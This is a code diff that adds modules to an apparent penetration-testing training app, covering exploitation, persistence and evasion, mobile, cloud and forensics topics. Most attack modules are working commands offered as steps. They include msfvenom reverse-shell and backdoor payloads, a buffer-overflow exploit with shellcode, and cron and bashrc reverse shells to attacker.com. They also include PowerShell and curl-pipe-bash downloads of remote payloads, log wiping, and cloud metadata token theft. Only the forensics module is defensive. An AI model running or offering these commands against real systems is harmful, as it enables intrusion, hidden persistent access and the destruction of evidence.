@@ -349,5 +349,614 @@ Invoke-BloodHound -CollectionMethod All -Domain domain.local
                 'explanation': 'BloodHound helps identify attack paths in Active Directory environments through graph analysis.'
             }
         ]
+    },
+    {
+        'id': 'vulnerability-assessment',
+        'title': 'Advanced Vulnerability Assessment & Exploitation',
+        'description': 'Comprehensive vulnerability scanning, analysis, and exploitation techniques using professional-grade tools',
+        'difficulty': 'Expert',
+        'duration': '70 minutes',
+        'category': 'Vulnerability Assessment',
+        'tools': ['nessus', 'openvas', 'nikto', 'searchsploit', 'exploit-db'],
+        'warning': 'Vulnerability exploitation should only be performed in authorized environments with proper documentation.',
+        'steps': [
+            {
+                'title': 'Comprehensive Vulnerability Scanning',
+                'content': 'Perform thorough vulnerability assessments using multiple scanning engines.',
+                'code': '''# OpenVAS comprehensive scan
+openvas-start
+openvas-adduser admin
+openvas-mkcert
+openvas-nvt-sync
+
+# Nessus professional scanning
+/opt/nessus/sbin/nessuscli adduser admin
+/opt/nessus/sbin/nessuscli policies --list
+systemctl start nessusd
+
+# Nikto web vulnerability scanner
+nikto -h http://target.com -output nikto_results.txt
+nikto -h http://target.com -Cgidirs all -maxtime 300s
+
+# Custom vulnerability assessment
+nmap --script vuln target.com
+nmap --script exploit target.com''',
+                'explanation': 'Multiple vulnerability scanners provide different perspectives and detect various types of security flaws.'
+            },
+            {
+                'title': 'Exploit Database Integration',
+                'content': 'Search and utilize exploits from comprehensive databases.',
+                'code': '''# SearchSploit exploit database searches
+searchsploit apache 2.4
+searchsploit -x 47887.py
+searchsploit --mirror 47887
+
+# Exploit Database integration
+updatedb
+locate exploit-db
+find /usr/share/exploitdb -name "*.py" | grep -i apache
+
+# Custom exploit modification
+cp /usr/share/exploitdb/exploits/linux/remote/exploit.py ./
+sed -i 's/RHOST = "127.0.0.1"/RHOST = "target.com"/' exploit.py
+
+# Payload generation for custom exploits
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > backdoor.exe''',
+                'explanation': 'Leveraging existing exploit databases saves time and provides tested attack vectors for known vulnerabilities.'
+            },
+            {
+                'title': 'Custom Exploit Development',
+                'content': 'Develop custom exploits for discovered vulnerabilities.',
+                'code': '''# Buffer overflow exploit template
+#!/usr/bin/env python3
+import socket
+import struct
+
+# Target configuration
+target_ip = "192.168.1.100"
+target_port = 9999
+
+# Shellcode generation (msfvenom)
+shellcode = (
+    b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
+    b"\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
+)
+
+# Exploit construction
+offset = 146
+ret_address = struct.pack("<I", 0x625011af)
+nop_sled = b"\\x90" * 16
+
+exploit = b"A" * offset + ret_address + nop_sled + shellcode
+
+# Send exploit
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_ip, target_port))
+s.send(exploit)
+s.close()
+
+# SQL injection exploit
+import requests
+
+# Custom SQLi payload
+payload = {
+    'username': "admin' UNION SELECT 1,2,database()-- -",
+    'password': 'anything'
+}
+
+response = requests.post('http://target.com/login', data=payload)
+print(response.text)''',
+                'explanation': 'Custom exploit development allows targeting specific vulnerabilities not covered by existing exploits.'
+            }
+        ]
+    },
+    {
+        'id': 'advanced-persistence',
+        'title': 'Advanced Persistence & Stealth Techniques',
+        'description': 'Master sophisticated methods for maintaining long-term access while evading detection',
+        'difficulty': 'Expert',
+        'duration': '65 minutes',
+        'category': 'Persistence',
+        'tools': ['empire', 'covenant', 'pupy', 'veil-evasion'],
+        'warning': 'Persistence techniques must only be used in authorized penetration testing scenarios.',
+        'steps': [
+            {
+                'title': 'Advanced Windows Persistence',
+                'content': 'Implement sophisticated persistence mechanisms on Windows systems.',
+                'code': '''# Registry-based persistence
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\\Windows\\System32\\backdoor.exe"
+
+# Service-based persistence
+sc create "WindowsSecurityService" binpath= "C:\\Windows\\System32\\backdoor.exe" start= auto
+sc description "WindowsSecurityService" "Provides critical security updates"
+
+# WMI event-based persistence
+wmic /node:localhost /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="BotFilter48", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+
+# PowerShell profile persistence
+echo 'IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")' >> $PROFILE
+
+# DLL hijacking persistence
+copy malicious.dll "C:\\Program Files\\Application\\legitimate.dll"
+
+# Scheduled task persistence
+schtasks /create /tn "SystemMaintenance" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Windows\\System32\\backdoor.ps1" /sc daily /st 09:00''',
+                'explanation': 'Multiple persistence vectors increase chances of maintaining access even if some methods are discovered.'
+            },
+            {
+                'title': 'Linux Persistence Techniques',
+                'content': 'Establish persistent access on Linux systems using various methods.',
+                'code': '''# Cron job persistence
+echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -
+
+# SSH key persistence
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# Systemd service persistence
+cat > /etc/systemd/system/security-update.service << EOF
+[Unit]
+Description=Security Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash /tmp/backdoor.sh
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable security-update.service
+systemctl start security-update.service
+
+# Bashrc persistence
+echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bashrc
+
+# Library hijacking persistence
+export LD_PRELOAD="/tmp/malicious.so"
+echo 'export LD_PRELOAD="/tmp/malicious.so"' >> ~/.bashrc
+
+# Init.d persistence (older systems)
+cp backdoor.sh /etc/init.d/security-service
+chmod +x /etc/init.d/security-service
+update-rc.d security-service defaults''',
+                'explanation': 'Linux persistence requires understanding of various startup mechanisms and user environments.'
+            },
+            {
+                'title': 'Evasion and Anti-Forensics',
+                'content': 'Implement techniques to avoid detection and complicate forensic analysis.',
+                'code': '''# Log evasion techniques
+# Clear specific log entries
+sed -i '/attacker_ip/d' /var/log/auth.log
+sed -i '/suspicious_activity/d' /var/log/syslog
+
+# Timestamp manipulation
+touch -r /bin/ls /tmp/backdoor.sh
+touch -d "2023-01-01 00:00:00" suspicious_file.txt
+
+# Process hiding
+kill -STOP $$ # Hide current process
+
+# Memory-only execution
+curl -s http://attacker.com/payload.sh | bash
+wget -O - http://attacker.com/payload.sh | bash
+
+# File attribute manipulation
+chattr +i important_file.txt  # Make immutable
+chattr +a log_file.txt        # Append only
+
+# Rootkit installation (for educational purposes)
+./rootkit_installer --stealth --hide-processes --hide-files
+
+# Anti-forensics file deletion
+shred -vfz -n 10 sensitive_file.txt
+dd if=/dev/urandom of=sensitive_file.txt bs=1M count=10
+rm sensitive_file.txt
+
+# Network evasion
+# Use encrypted channels
+openssl s_client -connect attacker.com:443 -quiet
+socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork EXEC:/bin/bash
+
+# DNS tunneling
+iodine -f -c -P password tunnel.attacker.com''',
+                'explanation': 'Evasion techniques help maintain access longer by avoiding detection systems and forensic analysis.'
+            }
+        ]
+    },
+    {
+        'id': 'mobile-security',
+        'title': 'Mobile Device Security Testing',
+        'description': 'Comprehensive mobile application and device security assessment techniques',
+        'difficulty': 'Advanced',
+        'duration': '60 minutes',
+        'category': 'Mobile Security',
+        'tools': ['apktool', 'dex2jar', 'jadx', 'frida', 'objection'],
+        'warning': 'Mobile security testing should only be performed on devices and applications you own or have permission to test.',
+        'steps': [
+            {
+                'title': 'Android Application Analysis',
+                'content': 'Comprehensive analysis of Android applications for security vulnerabilities.',
+                'code': '''# APK reverse engineering
+apktool d application.apk
+unzip application.apk
+dex2jar classes.dex
+
+# Static analysis with JADX
+jadx -d output_directory application.apk
+jadx-gui application.apk
+
+# Dynamic analysis setup
+adb devices
+adb install application.apk
+adb logcat | grep -i "application_package"
+
+# Frida dynamic instrumentation
+frida-ps -U  # List processes
+frida -U -l script.js com.application.package
+
+# Certificate pinning bypass
+frida -U --codeshare akabe1/frida-multiple-unpinning -f com.application.package
+
+# Root detection bypass
+frida -U --codeshare dzonerzy/fridantiroot -f com.application.package
+
+# Network traffic analysis
+mitmdump -s capture_script.py
+burpsuite --project-file=mobile_test.burp''',
+                'explanation': 'Android applications require both static and dynamic analysis to identify security vulnerabilities.'
+            },
+            {
+                'title': 'iOS Application Security Testing',
+                'content': 'Security assessment techniques for iOS applications and devices.',
+                'code': '''# iOS application extraction (jailbroken device)
+ssh root@ios_device_ip
+find /var/containers/Bundle/Application -name "*.app"
+scp -r root@ios_device_ip:/path/to/app.app ./
+
+# Class-dump for Objective-C headers
+class-dump -H Application.app/Application > headers.h
+
+# Cycript dynamic analysis
+cycript -p Application
+[UIApplication sharedApplication]
+
+# Keychain analysis
+python keychain_dumper.py
+sqlite3 /private/var/Keychains/keychain-2.db
+
+# Binary analysis with Hopper
+hopper -e Application.app/Application
+
+# Runtime manipulation with Frida
+frida -U -l ios_bypass.js Application
+
+# SSL kill switch for certificate pinning
+# Install SSL Kill Switch 2 from Cydia
+
+# Network traffic capture
+rvictl -s [UDID]  # Create virtual interface
+tcpdump -i rvi0 -w ios_traffic.pcap''',
+                'explanation': 'iOS security testing requires jailbroken devices and specialized tools for application analysis.'
+            },
+            {
+                'title': 'Mobile Device Exploitation',
+                'content': 'Advanced techniques for exploiting mobile devices and applications.',
+                'code': '''# Android exploitation framework
+msfconsole
+use exploit/android/browser/webkit_navigator_getstoragearray_uxss
+set RHOST android_device_ip
+exploit
+
+# Custom Android payload creation
+msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -o malicious.apk
+
+# ADB exploitation
+adb connect target_device:5555
+adb shell
+su
+
+# Android Debug Bridge attacks
+adb backup -apk -shared -nosystem -all
+dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" | tar -xvf -
+
+# NFC exploitation
+nfc-list
+nfc-mfclassic r a dump.mfd mifare_card.mfd
+
+# Bluetooth exploitation
+hcitool scan
+sdptool browse target_mac_address
+l2ping target_mac_address
+
+# iOS exploitation (if applicable)
+# Note: iOS exploitation requires specific conditions and is highly restricted
+checkra1n  # Hardware-based jailbreak tool
+unc0ver   # Software-based jailbreak tool''',
+                'explanation': 'Mobile exploitation techniques vary significantly between platforms and device configurations.'
+            }
+        ]
+    },
+    {
+        'id': 'cloud-security',
+        'title': 'Cloud Infrastructure Security Assessment',
+        'description': 'Advanced techniques for testing cloud platforms, containers, and infrastructure security',
+        'difficulty': 'Expert',
+        'duration': '75 minutes',
+        'category': 'Cloud Security',
+        'tools': ['aws-cli', 'azure-cli', 'kubectl', 'docker', 'terraform'],
+        'warning': 'Cloud security testing requires proper authorization and should only be performed on resources you own or have permission to test.',
+        'steps': [
+            {
+                'title': 'AWS Security Assessment',
+                'content': 'Comprehensive security testing of Amazon Web Services infrastructure.',
+                'code': '''# AWS reconnaissance and enumeration
+aws configure list
+aws sts get-caller-identity
+aws ec2 describe-instances
+aws s3 ls
+aws iam list-users
+aws rds describe-db-instances
+
+# S3 bucket security testing
+aws s3 ls s3://target-bucket --recursive
+aws s3 cp s3://target-bucket/sensitive-file.txt ./
+aws s3api get-bucket-acl --bucket target-bucket
+aws s3api get-bucket-policy --bucket target-bucket
+
+# IAM privilege escalation
+aws iam list-attached-user-policies --user-name target-user
+aws iam get-policy-version --policy-arn arn:aws:iam::account:policy/PolicyName --version-id v1
+aws sts assume-role --role-arn arn:aws:iam::account:role/RoleName --role-session-name test
+
+# Lambda security testing
+aws lambda list-functions
+aws lambda get-function --function-name target-function
+aws lambda invoke --function-name target-function response.json
+
+# CloudTrail log analysis
+aws logs describe-log-groups
+aws logs filter-log-events --log-group-name CloudTrail/APIGateway --filter-pattern "ERROR"
+
+# Security group analysis
+aws ec2 describe-security-groups --group-ids sg-12345678
+aws ec2 authorize-security-group-ingress --group-id sg-12345678 --protocol tcp --port 22 --cidr 0.0.0.0/0''',
+                'explanation': 'AWS security assessment requires understanding of IAM permissions, service configurations, and logging mechanisms.'
+            },
+            {
+                'title': 'Container Security Testing',
+                'content': 'Advanced Docker and Kubernetes security assessment techniques.',
+                'code': '''# Docker security analysis
+docker ps -a
+docker images
+docker inspect container_id
+docker exec -it container_id /bin/bash
+
+# Container escape techniques
+# Mount host filesystem
+docker run -v /:/host -it ubuntu chroot /host bash
+
+# Privileged container exploitation
+docker run --privileged -it ubuntu bash
+mount /dev/sda1 /mnt
+chroot /mnt bash
+
+# Docker daemon exploitation
+docker -H tcp://target:2376 ps
+docker -H tcp://target:2376 run -v /:/host -it ubuntu chroot /host bash
+
+# Kubernetes security testing
+kubectl get pods --all-namespaces
+kubectl get secrets --all-namespaces
+kubectl get serviceaccounts --all-namespaces
+kubectl auth can-i --list
+
+# Kubernetes privilege escalation
+kubectl exec -it target-pod -- /bin/bash
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
+
+# Container image vulnerability scanning
+docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image alpine:latest
+clair-scanner --ip localhost alpine:latest
+
+# Registry security testing
+docker pull private-registry.com/image:tag
+docker login private-registry.com
+docker push malicious-image:latest''',
+                'explanation': 'Container security involves testing both the container runtime and orchestration platforms like Kubernetes.'
+            },
+            {
+                'title': 'Azure and GCP Security Testing',
+                'content': 'Security assessment techniques for Microsoft Azure and Google Cloud Platform.',
+                'code': '''# Azure security assessment
+az login
+az account show
+az vm list
+az storage account list
+az keyvault list
+
+# Azure Active Directory enumeration
+az ad user list
+az ad group list
+az role assignment list
+az ad app list
+
+# Azure storage testing
+az storage blob list --account-name storageaccount --container-name container
+az storage blob download --account-name storageaccount --container-name container --name file.txt --file ./file.txt
+
+# Google Cloud Platform testing
+gcloud auth list
+gcloud projects list
+gcloud compute instances list
+gcloud storage buckets list
+
+# GCP IAM analysis
+gcloud projects get-iam-policy project-id
+gcloud iam roles list
+gcloud iam service-accounts list
+
+# GCP storage security
+gsutil ls gs://bucket-name
+gsutil cp gs://bucket-name/file.txt ./
+gsutil iam get gs://bucket-name
+
+# Cloud metadata exploitation
+curl http://169.254.169.254/latest/meta-data/
+curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
+curl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token
+
+# Terraform security analysis
+terraform plan
+terraform show
+grep -r "password\|secret\|key" *.tf''',
+                'explanation': 'Multi-cloud security requires understanding different authentication mechanisms and service configurations.'
+            }
+        ]
+    },
+    {
+        'id': 'forensics-investigation',
+        'title': 'Digital Forensics & Incident Response',
+        'description': 'Advanced digital forensics techniques for incident response and evidence collection',
+        'difficulty': 'Expert',
+        'duration': '80 minutes',
+        'category': 'Digital Forensics',
+        'tools': ['autopsy', 'volatility', 'sleuthkit', 'binwalk', 'foremost'],
+        'warning': 'Digital forensics techniques should only be used for legitimate investigations with proper legal authorization.',
+        'steps': [
+            {
+                'title': 'Memory Forensics Analysis',
+                'content': 'Advanced memory dump analysis using Volatility framework.',
+                'code': '''# Memory dump acquisition
+# Physical memory acquisition
+dd if=/dev/mem of=memory_dump.raw bs=1M
+LiME (Linux Memory Extractor) for live systems
+
+# Volatility memory analysis
+volatility -f memory_dump.raw imageinfo
+volatility -f memory_dump.raw --profile=Win7SP1x64 pslist
+volatility -f memory_dump.raw --profile=Win7SP1x64 pstree
+volatility -f memory_dump.raw --profile=Win7SP1x64 psscan
+
+# Network connections analysis
+volatility -f memory_dump.raw --profile=Win7SP1x64 netscan
+volatility -f memory_dump.raw --profile=Win7SP1x64 netstat
+
+# Process analysis
+volatility -f memory_dump.raw --profile=Win7SP1x64 dlllist -p 1234
+volatility -f memory_dump.raw --profile=Win7SP1x64 handles -p 1234
+volatility -f memory_dump.raw --profile=Win7SP1x64 cmdline
+
+# Malware analysis
+volatility -f memory_dump.raw --profile=Win7SP1x64 malfind
+volatility -f memory_dump.raw --profile=Win7SP1x64 yarascan -Y "/path/to/rules.yar"
+
+# Registry analysis
+volatility -f memory_dump.raw --profile=Win7SP1x64 hivelist
+volatility -f memory_dump.raw --profile=Win7SP1x64 printkey -K "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+# File extraction
+volatility -f memory_dump.raw --profile=Win7SP1x64 filescan
+volatility -f memory_dump.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 -D ./output/''',
+                'explanation': 'Memory forensics provides insights into running processes and system state at the time of acquisition.'
+            },
+            {
+                'title': 'Disk Forensics and File Recovery',
+                'content': 'Comprehensive disk analysis and file recovery techniques.',
+                'code': '''# Disk imaging and acquisition
+dd if=/dev/sda of=disk_image.dd bs=4096 conv=noerror,sync
+dcfldd if=/dev/sda of=disk_image.dd hash=sha256 hashlog=hash.log
+
+# Disk analysis with Sleuth Kit
+mmls disk_image.dd
+fsstat -o 2048 disk_image.dd
+fls -o 2048 disk_image.dd
+
+# Timeline creation
+fls -r -m / disk_image.dd > timeline.body
+mactime -b timeline.body -d -z UTC > timeline.csv
+
+# File recovery
+foremost -i disk_image.dd -o recovered_files/
+scalpel disk_image.dd -o carved_files/
+photorec disk_image.dd
+
+# Deleted file analysis
+istat -o 2048 disk_image.dd 12345
+icat -o 2048 disk_image.dd 12345 > recovered_file.txt
+tsk_recover -i disk_image.dd -o recovered_files/
+
+# Autopsy GUI analysis
+autopsy &
+# Create new case and add disk image as data source
+
+# File signature analysis
+binwalk disk_image.dd
+binwalk -e suspicious_file.bin
+strings disk_image.dd | grep -i password
+
+# Hash analysis
+md5deep -r /evidence/directory > hash_values.txt
+hashdeep -c sha256 -r /evidence/directory
+
+# Registry analysis (Windows)
+regripper -r SOFTWARE -p all > software_analysis.txt
+rip.pl -r SYSTEM -p compname''',
+                'explanation': 'Disk forensics involves creating forensic images and analyzing file systems for evidence and recovered data.'
+            },
+            {
+                'title': 'Network Forensics and Log Analysis',
+                'content': 'Advanced network traffic analysis and log correlation techniques.',
+                'code': '''# Network traffic capture and analysis
+tcpdump -i eth0 -w capture.pcap host 192.168.1.100
+tshark -r capture.pcap -Y "http.request"
+tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
+
+# Wireshark analysis
+wireshark capture.pcap &
+# Use filters: ip.addr == 192.168.1.100 && http
+
+# Network forensics with NetworkMiner
+mono /opt/NetworkMiner/NetworkMiner.exe
+
+# Log analysis techniques
+# Apache log analysis
+awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr
+grep -E "POST|PUT|DELETE" /var/log/apache2/access.log
+
+# System log analysis
+journalctl --since "2024-01-01" --until "2024-01-02"
+grep -i "failed\|error\|denied" /var/log/auth.log
+last -f /var/log/wtmp
+lastlog
+
+# Windows Event Log analysis (using python-evtx)
+python evtx_dump.py System.evtx > system_events.xml
+grep -i "logon\|failed" system_events.xml
+
+# SIEM correlation
+# ELK Stack log analysis
+curl -X GET "localhost:9200/_search" -H 'Content-Type: application/json' -d'
+{
+  "query": {
+    "range": {
+      "@timestamp": {
+        "gte": "2024-01-01",
+        "lte": "2024-01-02"
+      }
+    }
+  }
+}'
+
+# Splunk search queries
+index=security sourcetype=apache_access | stats count by clientip | sort -count''',
+                'explanation': 'Network forensics and log analysis help reconstruct events and identify attack patterns across systems.'
+            }
+        ]
     }
 ]
